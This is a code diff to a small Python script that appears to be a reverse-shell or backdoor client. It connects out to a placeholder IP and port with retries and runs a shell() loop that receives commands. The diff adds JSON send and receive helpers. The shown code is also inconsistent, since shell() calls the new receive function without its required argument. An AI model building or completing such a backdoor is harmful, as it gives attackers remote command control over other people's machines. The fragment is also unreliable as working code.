@@ -1,5 +1,6 @@
 import socket
 import time
+import json
 
 IP = None
 PORT = None
@@ -13,8 +14,18 @@ def connect(s):
         except:
             connect(s)
 
-def reliable_receive():
-    pass
+def reliable_send(command, target):
+    jsondata = json.dumps(command)
+    target.send(jsondata.encode())
+
+def reliable_receive(target):
+    data = ""
+    while(True):
+        try:
+            data += target.recv(1024).decode().rstrip()
+            return json.loads(data)
+        except:
+            continue
 def shell():
     while(True):
         command = reliable_receive()
